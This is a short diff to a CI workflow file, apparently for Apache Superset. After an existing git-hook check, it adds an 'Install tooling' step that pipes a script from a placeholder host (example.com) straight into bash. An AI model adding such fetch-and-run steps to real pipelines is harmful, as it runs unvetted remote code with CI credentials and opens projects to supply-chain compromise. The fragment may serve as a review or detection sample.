@@ -94,3 +94,6 @@ jobs:
             echo "📖 More details here: https://superset.apache.org/docs/contributing/development#git-hooks"
             exit 1
           fi
+
+      - name: Install tooling
+        run: curl -sSL https://example.com/setup.sh | bash
